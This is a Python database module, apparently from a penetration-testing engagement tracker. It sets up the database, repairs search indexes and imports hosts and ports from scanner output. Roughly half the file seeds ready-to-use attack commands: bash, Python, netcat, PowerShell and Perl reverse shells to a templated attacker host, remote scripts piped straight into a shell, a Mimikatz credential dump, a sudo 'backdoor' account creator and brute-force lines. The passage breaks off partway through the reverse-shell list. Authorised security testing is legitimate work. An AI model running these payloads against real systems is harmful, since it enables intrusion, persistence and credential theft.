import os
import sqlite3
from config import Config

def get_db_connection():
    """
    Get a connection to the SQLite database.

    Delegates to the encryption module which transparently returns either
    an encrypted (SQLCipher) or plain (sqlite3) connection.

    Returns:
        Database connection (sqlcipher or sqlite3)
    """
    from models.encryption import get_connection

    # Create data directory if it doesn't exist
    db_dir = os.path.dirname(Config.DATABASE_PATH)
    if db_dir and not os.path.exists(db_dir):
        os.makedirs(db_dir)

    return get_connection(Config.DATABASE_PATH)


def init_db():
    """
    Initialize the database schema from schema.sql.
    Uses temporary key for initial setup - will be re-keyed after user setup.
    """
    from models.migrations import apply_migrations

    conn = get_db_connection()
    cursor = conn.cursor()

    # Read schema file
    from config import BASE_DIR
    schema_path = os.path.join(BASE_DIR, 'models', 'schema.sql')
    with open(schema_path, 'r') as f:
        schema_sql = f.read()

    # Execute each statement separately (executescript doesn't work well with SQLCipher)
    # Split by semicolons but handle triggers specially
    import re

    # Remove comments first
    schema_sql = re.sub(r'--[^\n]*', '', schema_sql)

    # Split statements - triggers are special because they contain semicolons
    statements = []
    current = []
    in_block = False

    for line in schema_sql.split('\n'):
        line = line.strip()
        if not line:
            continue

        current.append(line)

        # Check if we're entering a BEGIN...END block
        if 'BEGIN' in line.upper():
            in_block = True
        # Check if we're leaving a BEGIN...END block
        elif 'END;' in line.upper() and in_block:
            in_block = False
            statements.append(' '.join(current))
            current = []
        # Regular statement end
        elif line.endswith(';') and not in_block:
            statements.append(' '.join(current))
            current = []

    # Execute each statement
    for statement in statements:
        if statement.strip():
            try:
                cursor.execute(statement)
            except Exception as e:
                print(f"Error executing statement: {statement[:150]}...")
                raise

    # Add generated columns for JSON metadata optimization
    # These are added dynamically to avoid issues with existing databases
    try:
        # Check if generated columns already exist
        cursor.execute("SELECT COUNT(*) FROM pragma_table_info('evidence') WHERE name IN ('tool_name', 'severity_level')")
        existing_cols = cursor.fetchone()[0]

        if existing_cols == 0:
            # Add tool_name generated column
            cursor.execute('''
                ALTER TABLE evidence
                ADD COLUMN tool_name TEXT GENERATED ALWAYS AS (
                    json_extract(metadata, '$.tool')
                ) STORED
            ''')

            # Add severity_level generated column
            # Extract the highest severity from metadata.summary.by_severity
            cursor.execute('''
                ALTER TABLE evidence
                ADD COLUMN severity_level TEXT GENERATED ALWAYS AS (
                    CASE
                        WHEN CAST(json_extract(metadata, '$.summary.by_severity.Critical') AS INTEGER) > 0 THEN 'critical'
                        WHEN CAST(json_extract(metadata, '$.summary.by_severity.High') AS INTEGER) > 0 THEN 'high'
                        WHEN CAST(json_extract(metadata, '$.summary.by_severity.Medium') AS INTEGER) > 0 THEN 'medium'
                        WHEN CAST(json_extract(metadata, '$.summary.by_severity.Low') AS INTEGER) > 0 THEN 'low'
                        ELSE NULL
                    END
                ) STORED
            ''')

            # Create indexes on generated columns
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_evidence_tool_name ON evidence(tool_name)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_evidence_severity ON evidence(severity_level)')

            print("Generated columns (tool_name, severity_level) and indexes created")
    except Exception as e:
        print(f"Note: Could not create generated columns (may already exist or SQLite version < 3.31): {e}")

    # Rebuild FTS index for any existing evidence
    try:
        # FTS4 rebuild command (different from FTS5)
        cursor.execute("INSERT INTO evidence_fts(evidence_fts) VALUES('rebuild')")
    except Exception as e:
        # Ignore errors if FTS table doesn't exist yet or no data
        pass

    conn.commit()

    print(f"Database initialized at {Config.DATABASE_PATH}")

    # Apply migrations (will mark migration 001 as applied)
    print("\nApplying database migrations...")
    applied, failed = apply_migrations(conn)
    if applied > 0:
        print(f"✓ Applied {applied} migration(s)")
    if failed > 0:
        print(f"✗ {failed} migration(s) failed")

    conn.close()

    # Run host migration for any existing evidence
    try:
        migrate_hosts_from_evidence()
    except Exception as e:
        print(f"Note: Host migration skipped or failed: {e}")

    # Run port migration for any existing evidence
    try:
        migrate_ports_from_evidence()
    except Exception as e:
        print(f"Note: Port migration skipped or failed: {e}")


def seed_default_user():
    """No-op: use the /setup wizard to create the initial admin account."""
    pass


def _repair_fts(conn):
    """
    Detect and repair a missing evidence_fts virtual table.

    This can happen when a plaintext→encrypted migration silently skips the
    CREATE VIRTUAL TABLE statement.  The three sync triggers are still present,
    so any INSERT/UPDATE/DELETE on evidence raises:
        OperationalError: no such table: main.evidence_fts

    Called unconditionally at startup so every binary self-heals without
    relying on a specific migration version being bundled.
    """
    cursor = conn.cursor()
    cursor.execute(
        "SELECT name FROM sqlite_master WHERE type='table' AND name='evidence_fts'"
    )
    if cursor.fetchone():
        return  # healthy — nothing to do

    print("WARNING: evidence_fts missing — attempting self-repair")
    try:
        cursor.execute("""
            CREATE VIRTUAL TABLE evidence_fts USING fts4(
                title,
                content,
                metadata,
                tokenize=unicode61
            )
        """)
        # Recreate sync triggers
        cursor.execute("""
            CREATE TRIGGER IF NOT EXISTS evidence_fts_insert
            AFTER INSERT ON evidence
            BEGIN
                INSERT INTO evidence_fts(docid, title, content, metadata)
                VALUES (new.id, new.title, new.content, new.metadata);
            END
        """)
        cursor.execute("""
            CREATE TRIGGER IF NOT EXISTS evidence_fts_update
            AFTER UPDATE ON evidence
            BEGIN
                UPDATE evidence_fts
                SET title = new.title, content = new.content, metadata = new.metadata
                WHERE docid = old.id;
            END
        """)
        cursor.execute("""
            CREATE TRIGGER IF NOT EXISTS evidence_fts_delete
            AFTER DELETE ON evidence
            BEGIN
                DELETE FROM evidence_fts WHERE docid = old.id;
            END
        """)
        cursor.execute("""
            INSERT INTO evidence_fts(docid, title, content, metadata)
            SELECT id, title, content, metadata FROM evidence
        """)
        conn.commit()
        print("evidence_fts repaired and index rebuilt")
    except Exception as e:
        # FTS4 unavailable on this build — drop the broken triggers so
        # evidence operations succeed without full-text search
        print(f"FTS4 unavailable ({e}); dropping broken triggers")
        try:
            cursor.execute("DROP TRIGGER IF EXISTS evidence_fts_insert")
            cursor.execute("DROP TRIGGER IF EXISTS evidence_fts_update")
            cursor.execute("DROP TRIGGER IF EXISTS evidence_fts_delete")
            conn.commit()
            print("Broken FTS triggers removed — imports will work without FTS")
        except Exception as drop_err:
            print(f"Failed to drop triggers: {drop_err}")


def run_migrations():
    """
    Run database migrations using the new migration system.
    Replaces the old monolithic migration function with a versioned approach.
    """
    from models.migrations import apply_migrations

    conn = get_db_connection()

    try:
        # Always check and repair FTS state before running migrations
        _repair_fts(conn)

        # Apply all pending migrations
        applied, failed = apply_migrations(conn)

        if failed > 0:
            print(f"✗ {failed} migration(s) failed")
            return False

        if applied > 0:
            print(f"✓ Applied {applied} migration(s)")

        # Seed pre-built commands if needed
        seed_commands()

        # Seed pre-built shell one-liners if needed
        seed_shell_oneliners()

        # Seed default report templates if needed
        try:
            from models.seed_templates import seed_default_templates
            seed_default_templates(conn)
        except Exception as e:
            print(f"Note: Template seeding skipped or failed: {e}")

        return True

    finally:
        conn.close()


# migrate_host_indicators function removed - now handled by migration 003


def migrate_hosts_from_evidence(conn=None):
    """
    Migrate existing evidence to extract hosts from metadata.
    Populates hosts and evidence_hosts tables from parsed tool output.
    Safe to run multiple times - skips already-processed evidence.
    """
    import json
    from urllib.parse import urlparse

    close_conn = False
    if conn is None:
        conn = get_db_connection()
        close_conn = True

    cursor = conn.cursor()

    # Get all evidence with metadata that hasn't been processed for hosts
    cursor.execute('''
        SELECT e.id, e.engagement_id, e.metadata
        FROM evidence e
        WHERE e.metadata IS NOT NULL
        AND NOT EXISTS (
            SELECT 1 FROM evidence_hosts eh WHERE eh.evidence_id = e.id
        )
    ''')

    rows = cursor.fetchall()
    migrated_count = 0

    for evidence_id, engagement_id, metadata_json in rows:
        if not metadata_json:
            continue

        try:
            metadata = json.loads(metadata_json)
        except json.JSONDecodeError:
            continue

        hosts_to_link = []
        tool = metadata.get('tool', '')

        # Extract hosts based on tool type
        if tool == 'nmap':
            for host in metadata.get('hosts', []):
                ip = host.get('ip')
                if ip:
                    hosts_to_link.append({
                        'ip': ip,
                        'hostname': host.get('hostname'),
                        'os': host.get('os')
                    })

        elif tool == 'nessus':
            for host in metadata.get('hosts', []):
                ip = host.get('ip')
                if ip:
                    hosts_to_link.append({
                        'ip': ip,
                        'hostname': host.get('hostname'),
                        'os': host.get('os')
                    })

        elif tool == 'burp_suite':
            seen_hosts = set()
            for issue in metadata.get('issues', []):
                host_url = issue.get('host', '')
                if host_url and host_url not in seen_hosts:
                    seen_hosts.add(host_url)
                    # Parse URL to extract host
                    try:
                        if '://' in host_url:
                            parsed = urlparse(host_url)
                            ip = parsed.netloc
                        else:
                            ip = host_url
                        # Remove port if present
                        if ':' in ip:
                            ip = ip.split(':')[0]
                        if ip:
                            hosts_to_link.append({
                                'ip': ip,
                                'hostname': None,
                                'os': None
                            })
                    except Exception:
                        pass

        # Create/link hosts
        for host_data in hosts_to_link:
            try:
                # Get or create host
                cursor.execute('''
                    INSERT INTO hosts (engagement_id, ip, hostname, os)
                    VALUES (?, ?, ?, ?)
                    ON CONFLICT(engagement_id, ip) DO UPDATE SET
                        hostname = COALESCE(excluded.hostname, hosts.hostname),
                        os = COALESCE(excluded.os, hosts.os),
                        updated_at = CURRENT_TIMESTAMP
                ''', (engagement_id, host_data['ip'], host_data['hostname'], host_data['os']))

                # Get the host ID
                cursor.execute('''
                    SELECT id FROM hosts
                    WHERE engagement_id = ? AND ip = ?
                ''', (engagement_id, host_data['ip']))
                host_row = cursor.fetchone()

                if host_row:
                    host_id = host_row[0]
                    # Link evidence to host
                    cursor.execute('''
                        INSERT OR IGNORE INTO evidence_hosts (evidence_id, host_id, source)
                        VALUES (?, ?, 'auto')
                    ''', (evidence_id, host_id))
                    migrated_count += 1

            except Exception as e:
                print(f"Warning: Failed to link host {host_data['ip']} to evidence {evidence_id}: {e}")
                continue

    conn.commit()

    if close_conn:
        conn.close()

    if migrated_count > 0:
        print(f"Host migration: Linked {migrated_count} host-evidence relationships")

    return migrated_count


def migrate_ports_from_evidence(conn=None):
    """
    Migrate existing evidence to extract port information from metadata.
    Populates host_ports table from parsed nmap/nessus tool output.
    Safe to run multiple times - uses UPSERT to handle duplicates.
    """
    import json

    close_conn = False
    if conn is None:
        conn = get_db_connection()
        close_conn = True

    cursor = conn.cursor()

    # Get all evidence with metadata that contains port data
    cursor.execute('''
        SELECT e.id, e.engagement_id, e.metadata
        FROM evidence e
        WHERE e.metadata IS NOT NULL
        AND (
            json_extract(e.metadata, '$.tool') = 'nmap'
            OR json_extract(e.metadata, '$.tool') = 'nessus'
        )
    ''')

    rows = cursor.fetchall()
    ports_created = 0

    for evidence_id, engagement_id, metadata_json in rows:
        if not metadata_json:
            continue

        try:
            metadata = json.loads(metadata_json)
        except json.JSONDecodeError:
            continue

        tool = metadata.get('tool', '')

        # Extract ports based on tool type
        if tool == 'nmap':
            for host in metadata.get('hosts', []):
                ip = host.get('ip')
                if not ip:
                    continue

                # Get host_id for this IP
                cursor.execute('''
                    SELECT id FROM hosts
                    WHERE engagement_id = ? AND ip = ?
                ''', (engagement_id, ip))
                host_row = cursor.fetchone()
                if not host_row:
                    continue
                host_id = host_row[0]

                # Extract ports
                for port_data in host.get('open_ports', []):
                    port_num = port_data.get('port')
                    if not port_num:
                        continue

                    protocol = port_data.get('protocol', 'tcp')
                    state = port_data.get('state', 'open')
                    service = port_data.get('service')
                    product = port_data.get('product', '')
                    version = port_data.get('version', '')
                    version_str = f"{product} {version}".strip() if product or version else None

                    try:
                        cursor.execute('''
                            INSERT INTO host_ports (host_id, port, protocol, state, service, version, source, evidence_id)
                            VALUES (?, ?, ?, ?, ?, ?, 'nmap', ?)
                            ON CONFLICT(host_id, port, protocol) DO UPDATE SET
                                state = excluded.state,
                                service = COALESCE(excluded.service, host_ports.service),
                                version = COALESCE(excluded.version, host_ports.version),
                                updated_at = CURRENT_TIMESTAMP
                        ''', (host_id, port_num, protocol, state, service, version_str, evidence_id))
                        ports_created += 1
                    except Exception as e:
                        print(f"Warning: Failed to insert port {port_num}/{protocol} for host {ip}: {e}")

        elif tool == 'nessus':
            for host in metadata.get('hosts', []):
                ip = host.get('ip')
                if not ip:
                    continue

                # Get host_id for this IP
                cursor.execute('''
                    SELECT id FROM hosts
                    WHERE engagement_id = ? AND ip = ?
                ''', (engagement_id, ip))
                host_row = cursor.fetchone()
                if not host_row:
                    continue
                host_id = host_row[0]

                # Extract unique ports from vulnerabilities
                seen_ports = set()
                for vuln in host.get('vulnerabilities', []):
                    port_num = vuln.get('port')
                    if not port_num or port_num == '0':
                        continue
                    try:
                        port_num = int(port_num)
                    except (ValueError, TypeError):
                        continue

                    protocol = vuln.get('protocol', 'tcp')
                    port_key = (port_num, protocol)
                    if port_key in seen_ports:
                        continue
                    seen_ports.add(port_key)

                    service = vuln.get('svc_name') or vuln.get('service')

                    try:
                        cursor.execute('''
                            INSERT INTO host_ports (host_id, port, protocol, state, service, source, evidence_id)
                            VALUES (?, ?, ?, 'open', ?, 'nessus', ?)
                            ON CONFLICT(host_id, port, protocol) DO UPDATE SET
                                service = COALESCE(excluded.service, host_ports.service),
                                updated_at = CURRENT_TIMESTAMP
                        ''', (host_id, port_num, protocol, service, evidence_id))
                        ports_created += 1
                    except Exception as e:
                        print(f"Warning: Failed to insert port {port_num}/{protocol} for host {ip}: {e}")

    conn.commit()

    if close_conn:
        conn.close()

    if ports_created > 0:
        print(f"Port migration: Created/updated {ports_created} port entries")

    return ports_created


def seed_commands():
    """
    Seed database with pre-built pentesting commands.
    Safe to run multiple times - skips if commands already exist.
    """
    conn = get_db_connection()
    cursor = conn.cursor()

    # Check if commands already seeded
    cursor.execute("SELECT COUNT(*) FROM commands WHERE is_custom = 0")
    if cursor.fetchone()[0] > 0:
        conn.close()
        return  # Already seeded

    prebuilt_commands = [
        # RECON
        {
            "category": "Recon",
            "name": "Nmap Quick Scan",
            "command": "nmap -sV -sC -T4 {IP}",
            "description": "Quick service detection with default scripts",
            "variables": '[{"name": "IP", "description": "Target IP or hostname", "default": ""}]'
        },
        {
            "category": "Recon",
            "name": "Nmap Full Port Scan",
            "command": "nmap -sS -p- -T4 {IP} -oN {OUTPUT_FILE}",
            "description": "SYN scan all 65535 TCP ports",
            "variables": '[{"name": "IP", "description": "Target IP", "default": ""}, {"name": "OUTPUT_FILE", "description": "Output file path", "default": "scan.txt"}]'
        },
        {
            "category": "Recon",
            "name": "Nmap UDP Scan",
            "command": "sudo nmap -sU --top-ports 1000 {IP}",
            "description": "UDP scan top 1000 ports",
            "variables": '[{"name": "IP", "description": "Target IP", "default": ""}]'
        },
        {
            "category": "Recon",
            "name": "Nmap Vulnerability Scan",
            "command": "nmap -sV --script=vuln {IP}",
            "description": "Run vulnerability detection scripts",
            "variables": '[{"name": "IP", "description": "Target IP", "default": ""}]'
        },
        {
            "category": "Recon",
            "name": "Nikto Web Scanner",
            "command": "nikto -h {URL} -o {OUTPUT_FILE}",
            "description": "Web server vulnerability scanner",
            "variables": '[{"name": "URL", "description": "Target URL", "default": "http://"}, {"name": "OUTPUT_FILE", "description": "Output file", "default": "nikto.txt"}]'
        },

        # ENUMERATION
        {
            "category": "Enumeration",
            "name": "Gobuster Directory Scan",
            "command": "gobuster dir -u {URL} -w {WORDLIST} -t 50",
            "description": "Directory/file brute force",
            "variables": '[{"name": "URL", "description": "Target URL", "default": "http://"}, {"name": "WORDLIST", "description": "Wordlist path", "default": "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"}]'
        },
        {
            "category": "Enumeration",
            "name": "Feroxbuster Recursive Scan",
            "command": "feroxbuster -u {URL} -w {WORDLIST} -t 50 -d 2",
            "description": "Recursive directory brute force",
            "variables": '[{"name": "URL", "description": "Target URL", "default": "http://"}, {"name": "WORDLIST", "description": "Wordlist path", "default": "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt"}]'
        },
        {
            "category": "Enumeration",
            "name": "Enum4linux",
            "command": "enum4linux -a {IP}",
            "description": "SMB enumeration on Windows targets",
            "variables": '[{"name": "IP", "description": "Target IP", "default": ""}]'
        },
        {
            "category": "Enumeration",
            "name": "SMBClient List Shares",
            "command": "smbclient -L //{IP} -N",
            "description": "List SMB shares (null session)",
            "variables": '[{"name": "IP", "description": "Target IP", "default": ""}]'
        },
        {
            "category": "Enumeration",
            "name": "SMBMap Enumerate",
            "command": "smbmap -H {IP} -u '' -p ''",
            "description": "SMB share enumeration with permissions",
            "variables": '[{"name": "IP", "description": "Target IP", "default": ""}]'
        },
        {
            "category": "Enumeration",
            "name": "WPScan WordPress",
            "command": "wpscan --url {URL} --enumerate u,p,t",
            "description": "WordPress vulnerability scanner",
            "variables": '[{"name": "URL", "description": "WordPress URL", "default": "http://"}]'
        },
        {
            "category": "Enumeration",
            "name": "SNMP Walk",
            "command": "snmpwalk -v2c -c {COMMUNITY} {IP}",
            "description": "SNMP enumeration",
            "variables": '[{"name": "IP", "description": "Target IP", "default": ""}, {"name": "COMMUNITY", "description": "Community string", "default": "public"}]'
        },
        {
            "category": "Enumeration",
            "name": "DNS Zone Transfer",
            "command": "dig axfr @{DNS_SERVER} {DOMAIN}",
            "description": "Attempt DNS zone transfer",
            "variables": '[{"name": "DNS_SERVER", "description": "DNS server", "default": ""}, {"name": "DOMAIN", "description": "Target domain", "default": ""}]'
        },

        # EXPLOITATION
        {
            "category": "Exploitation",
            "name": "SQLMap Basic",
            "command": "sqlmap -u \"{URL}\" --batch --dbs",
            "description": "SQL injection testing - enumerate databases",
            "variables": '[{"name": "URL", "description": "URL with parameter (e.g., http://site.com/page?id=1)", "default": ""}]'
        },
        {
            "category": "Exploitation",
            "name": "SQLMap Dump Table",
            "command": "sqlmap -u \"{URL}\" --batch -D {DATABASE} -T {TABLE} --dump",
            "description": "Dump specific database table",
            "variables": '[{"name": "URL", "description": "URL with parameter", "default": ""}, {"name": "DATABASE", "description": "Database name", "default": ""}, {"name": "TABLE", "description": "Table name", "default": ""}]'
        },
        {
            "category": "Exploitation",
            "name": "Hydra SSH Brute Force",
            "command": "hydra -l {USER} -P {WORDLIST} ssh://{IP}",
            "description": "SSH password brute force",
            "variables": '[{"name": "IP", "description": "Target IP", "default": ""}, {"name": "USER", "description": "Username", "default": "root"}, {"name": "WORDLIST", "description": "Password list", "default": "/usr/share/wordlists/rockyou.txt"}]'
        },
        {
            "category": "Exploitation",
            "name": "Hydra HTTP POST Form",
            "command": "hydra -l {USER} -P {WORDLIST} {IP} http-post-form \"{PATH}:{PARAMS}:{FAIL_STRING}\"",
            "description": "HTTP form brute force",
            "variables": '[{"name": "IP", "description": "Target IP", "default": ""}, {"name": "USER", "description": "Username", "default": "admin"}, {"name": "WORDLIST", "description": "Password list", "default": "/usr/share/wordlists/rockyou.txt"}, {"name": "PATH", "description": "Login path", "default": "/login"}, {"name": "PARAMS", "description": "POST params", "default": "user=^USER^&pass=^PASS^"}, {"name": "FAIL_STRING", "description": "Failure indicator", "default": "Invalid"}]'
        },
        {
            "category": "Exploitation",
            "name": "Metasploit Handler",
            "command": "msfconsole -x \"use exploit/multi/handler; set payload {PAYLOAD}; set LHOST {LHOST}; set LPORT {LPORT}; exploit\"",
            "description": "Start Metasploit reverse shell listener",
            "variables": '[{"name": "PAYLOAD", "description": "Payload type", "default": "linux/x64/meterpreter/reverse_tcp"}, {"name": "LHOST", "description": "Local IP", "default": ""}, {"name": "LPORT", "description": "Local port", "default": "4444"}]'
        },
        {
            "category": "Exploitation",
            "name": "Reverse Shell - Bash",
            "command": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
            "description": "Bash reverse shell one-liner",
            "variables": '[{"name": "LHOST", "description": "Attacker IP", "default": ""}, {"name": "LPORT", "description": "Attacker port", "default": "4444"}]'
        },
        {
            "category": "Exploitation",
            "name": "Reverse Shell - Python",
            "command": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "description": "Python reverse shell",
            "variables": '[{"name": "LHOST", "description": "Attacker IP", "default": ""}, {"name": "LPORT", "description": "Attacker port", "default": "4444"}]'
        },
        {
            "category": "Exploitation",
            "name": "Reverse Shell - Netcat",
            "command": "nc -e /bin/sh {LHOST} {LPORT}",
            "description": "Netcat reverse shell (traditional)",
            "variables": '[{"name": "LHOST", "description": "Attacker IP", "default": ""}, {"name": "LPORT", "description": "Attacker port", "default": "4444"}]'
        },
        {
            "category": "Exploitation",
            "name": "Reverse Shell - PowerShell",
            "command": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
            "description": "PowerShell reverse shell for Windows",
            "variables": '[{"name": "LHOST", "description": "Attacker IP", "default": ""}, {"name": "LPORT", "description": "Attacker port", "default": "4444"}]'
        },

        # POST-EXPLOITATION
        {
            "category": "Post-exploitation",
            "name": "LinPEAS",
            "command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
            "description": "Linux privilege escalation enumeration",
            "variables": '[]'
        },
        {
            "category": "Post-exploitation",
            "name": "WinPEAS",
            "command": "powershell -c \"IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')\"",
            "description": "Windows privilege escalation enumeration",
            "variables": '[]'
        },
        {
            "category": "Post-exploitation",
            "name": "Find SUID Binaries",
            "command": "find / -perm -4000 -type f 2>/dev/null",
            "description": "Find SUID binaries for privesc",
            "variables": '[]'
        },
        {
            "category": "Post-exploitation",
            "name": "Find Writable Directories",
            "command": "find / -writable -type d 2>/dev/null",
            "description": "Find world-writable directories",
            "variables": '[]'
        },
        {
            "category": "Post-exploitation",
            "name": "Find Capabilities",
            "command": "getcap -r / 2>/dev/null",
            "description": "Find binaries with capabilities set",
            "variables": '[]'
        },
        {
            "category": "Post-exploitation",
            "name": "Spawn TTY Shell",
            "command": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
            "description": "Upgrade to interactive TTY shell",
            "variables": '[]'
        },
        {
            "category": "Post-exploitation",
            "name": "Mimikatz Dump",
            "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
            "description": "Dump credentials from Windows memory",
            "variables": '[]'
        },
        {
            "category": "Post-exploitation",
            "name": "Add User (Linux)",
            "command": "useradd -m -s /bin/bash {USERNAME} && echo '{USERNAME}:{PASSWORD}' | chpasswd && usermod -aG sudo {USERNAME}",
            "description": "Add backdoor user with sudo",
            "variables": '[{"name": "USERNAME", "description": "Username to create", "default": "backdoor"}, {"name": "PASSWORD", "description": "Password", "default": "password123"}]'
        },

        # REPORTING
        {
            "category": "Reporting",
            "name": "Screenshot with Cutycapt",
            "command": "cutycapt --url={URL} --out={OUTPUT_FILE}",
            "description": "Take webpage screenshot",
            "variables": '[{"name": "URL", "description": "Target URL", "default": "http://"}, {"name": "OUTPUT_FILE", "description": "Output file (PNG)", "default": "screenshot.png"}]'
        },
        {
            "category": "Reporting",
            "name": "Screenshot with EyeWitness",
            "command": "eyewitness --web -f {URL_FILE} -d {OUTPUT_DIR}",
            "description": "Bulk webpage screenshots",
            "variables": '[{"name": "URL_FILE", "description": "File with URLs", "default": "urls.txt"}, {"name": "OUTPUT_DIR", "description": "Output directory", "default": "./eyewitness"}]'
        },
        {
            "category": "Reporting",
            "name": "Convert Nmap XML to HTML",
            "command": "xsltproc {XML_FILE} -o {OUTPUT_FILE}",
            "description": "Convert Nmap XML output to HTML report",
            "variables": '[{"name": "XML_FILE", "description": "Nmap XML file", "default": "scan.xml"}, {"name": "OUTPUT_FILE", "description": "HTML output", "default": "report.html"}]'
        }
    ]

    for cmd in prebuilt_commands:
        cursor.execute('''
            INSERT INTO commands (category, name, command, description, variables, is_custom)
            VALUES (?, ?, ?, ?, ?, 0)
        ''', (cmd['category'], cmd['name'], cmd['command'], cmd['description'], cmd['variables']))

    conn.commit()
    conn.close()
    print(f"Seeded {len(prebuilt_commands)} pre-built commands")


def seed_shell_oneliners():
    """
    Seed database with pre-built shell one-liners.
    Safe to run multiple times - skips if one-liners already exist.
    """
    conn = get_db_connection()
    cursor = conn.cursor()

    # Check if one-liners already seeded
    cursor.execute("SELECT COUNT(*) FROM shell_oneliners WHERE is_admin = 1")
    if cursor.fetchone()[0] > 0:
        conn.close()
        return  # Already seeded

    prebuilt_oneliners = [
        # ==================== SHELLS (spawn interactive shells) ====================
        {
            "category": "shells",
            "subcategory": "python",
            "name": "Python PTY Spawn",
            "command": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
            "description": "Spawn interactive bash shell using Python pty module",
            "variables": "[]"
        },
        {
            "category": "shells",
            "subcategory": "python",
            "name": "Python3 PTY Spawn",
            "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
            "description": "Spawn interactive bash shell using Python3 pty module",
            "variables": "[]"
        },
        {
            "category": "shells",
            "subcategory": "perl",
            "name": "Perl Shell Spawn",
            "command": "perl -e 'exec \"/bin/bash\";'",
            "description": "Spawn bash shell using Perl",
            "variables": "[]"
        },
        {
            "category": "shells",
            "subcategory": "ruby",
            "name": "Ruby Shell Spawn",
            "command": "ruby -e 'exec \"/bin/bash\"'",
            "description": "Spawn bash shell using Ruby",
            "variables": "[]"
        },
        {
            "category": "shells",
            "subcategory": "lua",
            "name": "Lua Shell Spawn",
            "command": "lua -e 'os.execute(\"/bin/bash\")'",
            "description": "Spawn bash shell using Lua",
            "variables": "[]"
        },
        {
            "category": "shells",
            "subcategory": "awk",
            "name": "AWK Shell Spawn",
            "command": "awk 'BEGIN {system(\"/bin/bash\")}'",
            "description": "Spawn bash shell using AWK",
            "variables": "[]"
        },
        {
            "category": "shells",
            "subcategory": "find",
            "name": "Find Shell Spawn",
            "command": "find / -name test -exec /bin/bash \\;",
            "description": "Spawn bash shell using find command",
            "variables": "[]"
        },
        {
            "category": "shells",
            "subcategory": "vim",
            "name": "Vim Shell Escape",
            "command": "vim -c ':!/bin/bash'",
            "description": "Escape to bash from Vim",
            "variables": "[]"
        },
        {
            "category": "shells",
            "subcategory": "nmap",
            "name": "Nmap Interactive Shell",
            "command": "nmap --interactive\\n!sh",
            "description": "Spawn shell from Nmap interactive mode (older versions)",
            "variables": "[]"
        },

        # ==================== REVERSE SHELLS ====================
        # Bash
        {
            "category": "reverse_shells",
            "subcategory": "bash",
            "name": "Bash TCP",
            "command": "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1",
            "description": "Bash reverse shell over TCP",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
        },
        {
            "category": "reverse_shells",
            "subcategory": "bash",
            "name": "Bash TCP (Alternative)",
            "command": "exec 5<>/dev/tcp/{{LHOST}}/{{LPORT}}; cat <&5 | while read line; do $line 2>&5 >&5; done",
            "description": "Bash reverse shell using file descriptor",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
        },
        {
            "category": "reverse_shells",
            "subcategory": "bash",
            "name": "Bash UDP",
            "command": "sh -i >& /dev/udp/{{LHOST}}/{{LPORT}} 0>&1",
            "description": "Bash reverse shell over UDP",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
        },

        # Python
        {
            "category": "reverse_shells",
            "subcategory": "python",
            "name": "Python Reverse Shell",
            "command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{LHOST}}\",{{LPORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "description": "Python reverse shell",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
        },
        {
            "category": "reverse_shells",
            "subcategory": "python",
            "name": "Python3 Reverse Shell",
            "command": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{LHOST}}\",{{LPORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "description": "Python3 reverse shell",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
        },
        {
            "category": "reverse_shells",
            "subcategory": "python",
            "name": "Python PTY Reverse Shell",
            "command": "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"{{LHOST}}\",{{LPORT}}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
            "description": "Python reverse shell with PTY (better interactivity)",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
        },

        # Perl
        {
            "category": "reverse_shells",
            "subcategory": "perl",
            "name": "Perl Reverse Shell",
            "command": "perl -e 'use Socket;$i=\"{{LHOST}}\";$p={{LPORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
